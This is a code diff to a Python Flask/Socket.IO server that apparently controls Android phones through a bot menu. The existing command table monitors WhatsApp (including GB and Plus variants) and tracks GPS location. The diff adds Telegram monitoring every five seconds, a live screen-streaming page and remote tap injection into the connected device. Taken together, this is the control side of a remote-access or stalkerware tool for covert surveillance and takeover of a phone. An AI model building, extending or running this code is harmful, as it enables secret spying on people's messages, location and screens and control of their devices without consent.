@@ -243,8 +243,10 @@ COMMANDS = {
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     # whatsapp-live تمت إزالته
-    "whatsapp-monitor-on":  {"category": "data", "label": "🟢 بدء مراقبة الواتساب", "description": "مراقبة ذكية كل 10 ثوانٍ + بصمة MD5", "needs_param": False},
-    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الواتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
+    "whatsapp-monitor-on":  {"category": "data", "label": "🟢 مراقبة واتساب", "description": "مراقبة واتساب (رسمي + أعمال + GB + بلس) كل 5 ثوانٍ", "needs_param": False},
+    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
+    "telegram-monitor-on":  {"category": "data", "label": "🟢 مراقبة تيليجرام", "description": "مراقبة تيليجرام (رسمي + بلس) كل 5 ثوانٍ", "needs_param": False},
+    "telegram-monitor-off": {"category": "data", "label": "⏹ إيقاف تيليجرام", "description": "إيقاف مراقبة تيليجرام", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -452,6 +454,8 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"calls"), _cbtn(did,"apps"))
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
+    kb.add(_cbtn(did,"telegram-monitor-on"))
+    kb.add(_cbtn(did,"telegram-monitor-off"))
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
     return kb
@@ -2095,47 +2099,154 @@ def _sock_screen_frame(data):
         logger.error(f"❌ screen_frame error: {e}")
 
 
-# ⚡ صفحة ويب لبث الشاشة
+# ⚡ V11.2.23: صفحة ويب لبث الشاشة — responsive + remote control + Socket.IO push
 @app.route("/screen-live/<stream_id>")
 def _screen_live_page(stream_id):
-    if stream_id not in _screen_streams:
-        return make_response("<h1>البث غير نشط</h1>", 404)
-
+    # V11.2.23: تعمل دائماً (لا 404) + responsive + click control
     html = f"""<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>بث الشاشة المباشر</title>
     <style>
-        body {{ margin:0; background:#111; color:#fff; font-family:Arial,sans-serif; }}
-        .header {{ background:#222; padding:10px; text-align:center; }}
-        .frame {{ width:100%; max-width:800px; margin:10px auto; display:block; border:2px solid #333; border-radius:5px; }}
-        .status {{ text-align:center; font-size:12px; color:#888; padding:5px; }}
+        * {{ margin:0; padding:0; box-sizing:border-box; }}
+        body {{ background:#0a0a0a; color:#fff; font-family:Arial,sans-serif; }}
+        .header {{ background:#1a1a1a; padding:8px 10px; text-align:center; font-size:14px; }}
+        .container {{ position:relative; max-width:500px; margin:0 auto; }}
+        .screen-wrap {{ position:relative; width:100%; background:#000; border:1px solid #333; border-radius:4px; overflow:hidden; }}
+        .screen-wrap img {{ width:100%; display:block; min-height:300px; }}
+        .controls {{ padding:10px; text-align:center; }}
+        .toggle {{ display:inline-block; padding:6px 14px; margin:4px; border-radius:6px; font-size:13px; cursor:pointer; }}
+        .toggle.on {{ background:#2d5a27; color:#fff; }}
+        .toggle.off {{ background:#333; color:#888; }}
+        .status {{ text-align:center; font-size:12px; color:#888; padding:4px; }}
+        .info {{ text-align:center; font-size:11px; color:#666; padding:2px; }}
+        .click-dot {{ position:absolute; width:30px; height:30px; border:3px solid #ff0; border-radius:50%; pointer-events:none; transform:translate(-50%,-50%); display:none; z-index:10; }}
+        @media (max-width:600px) {{ .container {{ max-width:100%; }} .header {{ font-size:12px; }} }}
     </style>
 </head>
 <body>
-    <div class="header"><h2>📺 بث الشاشة المباشر</h2></div>
-    <img id="screen" class="frame" src="" alt="انتظار..." />
-    <div class="status" id="status">جاري التحميل...</div>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <div class="header">📺 بث الشاشة المباشر + 🖱️ تحكم بالنقر</div>
+    <div class="container">
+        <div class="screen-wrap" id="screenWrap">
+            <img id="screen" src="" alt="انتظار..." />
+            <div class="click-dot" id="clickDot"></div>
+        </div>
+        <div class="controls">
+            <span class="toggle on" id="clickToggle" onclick="toggleClick()">🖱️ النقر: مفعل</span>
+            <span class="toggle off" id="wsToggle" onclick="toggleWS()">⚡ WebSocket: مفعل</span>
+        </div>
+        <div class="status" id="status">⏳ جاري الاتصال...</div>
+        <div class="info" id="info">انتظر الإطارات...</div>
+    </div>
     <script>
         var streamId = "{stream_id}";
         var count = 0;
-        function poll() {{
-            fetch('/screen-frame/' + streamId)
-                .then(r => r.blob())
-                .then(blob => {{
-                    if (blob.size > 100) {{
-                        document.getElementById('screen').src = URL.createObjectURL(blob);
-                        count++;
-                        document.getElementById('status').textContent = '✅ مباشر - إطار #' + count;
-                    }}
-                }})
-                .catch(err => {{
-                    document.getElementById('status').textContent = '❌ خطأ: ' + err;
-                }});
+        var lastFrameTime = 0;
+        var clickEnabled = true;
+        var wsEnabled = true;
+
+        var socket = io({{
+            transports: ['websocket'],
+            upgrade: false,
+            reconnection: true,
+            reconnectionAttempts: Infinity,
+            reconnectionDelay: 1000
+        }});
+
+        socket.on('connect', function() {{
+            document.getElementById('status').textContent = '✅ متصل - انتظار الإطارات';
+            socket.emit('screen_join', {{ stream_id: streamId }});
+        }});
+
+        socket.on('disconnect', function() {{
+            document.getElementById('status').textContent = '⚠️ انقطع - إعادة الاتصال...';
+        }});
+
+        socket.on('screen_frame_push', function(data) {{
+            if (data && data.image && data.stream_id === streamId) {{
+                document.getElementById('screen').src = 'data:image/jpeg;base64,' + data.image;
+                count++;
+                var now = Date.now();
+                var fps = lastFrameTime > 0 ? Math.round(1000 / (now - lastFrameTime)) : 0;
+                lastFrameTime = now;
+                document.getElementById('status').textContent = '✅ مباشر - إطار #' + count + ' (' + fps + ' FPS)';
+                document.getElementById('info').textContent = '⚡ ' + (data.size/1024).toFixed(1) + ' KB | ' + new Date().toLocaleTimeString();
+            }}
+        }});
+
+        // ⚡ النقر على الشاشة → إرسال للجهاز
+        var screenImg = document.getElementById('screen');
+        var clickDot = document.getElementById('clickDot');
+        var screenWrap = document.getElementById('screenWrap');
+
+        screenWrap.addEventListener('click', function(e) {{
+            if (!clickEnabled) return;
+            var rect = screenImg.getBoundingClientRect();
+            var x = e.clientX - rect.left;
+            var y = e.clientY - rect.top;
+            var pctX = (x / rect.width * 100).toFixed(1);
+            var pctY = (y / rect.height * 100).toFixed(1);
+
+            // أظهر نقطة النقر
+            clickDot.style.left = x + 'px';
+            clickDot.style.top = y + 'px';
+            clickDot.style.display = 'block';
+            setTimeout(function() {{ clickDot.style.display = 'none'; }}, 500);
+
+            // أرسل النقرة للسيرفر → السيرفر يرسلها للجهاز
+            socket.emit('screen_click', {{
+                stream_id: streamId,
+                x: parseFloat(pctX),
+                y: parseFloat(pctY)
+            }});
+            document.getElementById('info').textContent = '🖱️ نقر: (' + pctX + '%, ' + pctY + '%)';
+        }});
+
+        function toggleClick() {{
+            clickEnabled = !clickEnabled;
+            var el = document.getElementById('clickToggle');
+            if (clickEnabled) {{
+                el.className = 'toggle on';
+                el.textContent = '🖱️ النقر: مفعل';
+            }} else {{
+                el.className = 'toggle off';
+                el.textContent = '🖱️ النقر: معطل';
+            }}
         }}
-        setInterval(poll, 200);
+
+        function toggleWS() {{
+            wsEnabled = !wsEnabled;
+            var el = document.getElementById('wsToggle');
+            if (wsEnabled) {{
+                el.className = 'toggle on';
+                el.textContent = '⚡ WebSocket: مفعل';
+            }} else {{
+                el.className = 'toggle off';
+                el.textContent = '⚡ WebSocket: معطل';
+            }}
+        }}
+
+        // Fallback: polling
+        setInterval(function() {{
+            if (!wsEnabled) return;
+            if (count === 0 || (Date.now() - lastFrameTime) > 200) {{
+                fetch('/screen-frame/' + streamId)
+                    .then(r => r.blob())
+                    .then(blob => {{
+                        if (blob.size > 100 && (count === 0 || (Date.now() - lastFrameTime) > 200)) {{
+                            document.getElementById('screen').src = URL.createObjectURL(blob);
+                            count++;
+                            lastFrameTime = Date.now();
+                            if (document.getElementById('status').textContent.includes('انتظار')) {{
+                                document.getElementById('status').textContent = '✅ مباشر (polling) - إطار #' + count;
+                            }}
+                        }}
+                    }}).catch(function(){{}});
+            }}
+        }}, 100);
     </script>
 </body>
 </html>"""
@@ -2151,6 +2262,41 @@ def _get_screen_frame(stream_id):
     if not jpeg:
         return make_response("", 404)
     return Response(jpeg, mimetype="image/jpeg")
+
+
+# ⚡ V11.2.23: استقبال نقرة من المتصفح وإرسالها للجهاز
+@socketio.on("screen_click")
+def _sock_screen_click(data):
+    """يستقبل نقرة من المتصفح ويرسلها للجهاز المتصل"""
+    try:
+        if isinstance(data, list) and len(data) >= 2:
+            data = data[1]
+        x = data.get("x", 0)
+        y = data.get("y", 0)
+        stream_id = data.get("stream_id", "")
+
+        # ابحث عن الجهاز المتصل
+        dev = None
+        for d in dm.get_online_devices():
+            if d.get("device_id"):
+                dev = d
+                break
+
+        if dev:
+            sid = dm.get_sid_for_device(dev["device_id"])
+            if sid:
+                payload = {
+                    "command": "screen_click",
+                    "category": "control",
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                    "params": {"x": x, "y": y}
+                }
+                socketio.emit("command", payload, room=sid)
+                logger.info(f"🖱️ Screen click sent to device: ({x}, {y})")
+        else:
+            logger.warning("⚠️ No online device for screen_click")
+    except Exception as e:
+        logger.error(f"❌ screen_click error: {e}")
 
 
 @socketio.on("camera_frame")
